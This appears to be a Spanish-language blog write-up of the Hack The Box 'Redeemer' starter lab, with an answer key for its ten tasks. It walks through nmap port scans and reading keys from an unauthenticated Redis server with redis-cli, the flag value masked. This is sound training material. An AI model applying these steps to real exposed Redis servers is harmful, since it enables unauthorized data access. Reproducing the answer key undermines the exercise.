---
title: Hack The Box - Starting Point - Tier 0 - Redeemer Writeup
date: 2022-08-09 09:30:00 +0800
categories: ["Hack The Box"]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Con este post finalizamos la serie **Tier 0** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-09-htb-writeup-tier0-meow %}).

## Redeemer

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

![](/assets/posts/20220809/img05.png)

Copiamos la IP del equipo remoto, en mi caso *10.129.213.71*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ nmap -A 10.129.213.71 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:46 CEST
Nmap scan report for 10.129.213.71
Host is up (0.12s latency).
All 1000 scanned ports on 10.129.213.71 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Ups !! ... nobody listen :(

Vamos a por todos los puertos utilizando la flag ```-p-```&nbsp;, no solo los 1000 de ```-A```&nbsp;.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ nmap -A -p- 10.129.213.71 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 12:48 CEST
Nmap scan report for 10.129.213.71
Host is up (0.075s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.85 seconds
```

Ahora si. Tenemos el puerto *6379/tcp* con el servicio *redis* escuchando. Para los que no sepáis qué es **Redis** podéis informaros [aquí](https://redis.io/).

Utilizamos **redis-cli** para conectarnos con el comando ```-h```&nbsp; para indicarle el host.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier0]
└─$ redis-cli -h 10.129.213.71
10.129.213.71:6379> 
```

Ejecutamos *info*

```console
[...]
10.129.213.71:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
[...]
10.129.213.71:6379>
```

Lanzamos un *select*, le pedimos todas las *keys* y volcamos con *get* la que nos interesa. Para mas info sobre estos comandos:

* [SELECT index](https://redis.io/commands/select/)
* [KEYS pattern](https://redis.io/commands/keys/)
* [GET key](https://redis.io/commands/get/)

```console
[...]
10.129.213.71:6379> select 0
OK
10.129.213.71:6379> keys *
1) "numb"
2) "flag"
3) "stor"
4) "temp"
10.129.213.71:6379> get flag
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
10.129.213.71:6379>
```

Con esto completamos el **Tier 0** y se nos habilita el botón para pasar al siguiente nivel, el **Tier 1**.

Enhorabuena a los que habéis llegado hasta aquí.

## Respuestas:

* <strong>Task 1</strong>: 6379
* <strong>Task 2</strong>: redis
* <strong>Task 3</strong>: In-memory Database
* <strong>Task 4</strong>: redis-cli
* <strong>Task 5</strong>: -h
* <strong>Task 6</strong>: info
* <strong>Task 7</strong>: 5.0.7
* <strong>Task 8</strong>: select
* <strong>Task 9</strong>: 4
* <strong>Task 10</strong>: keys *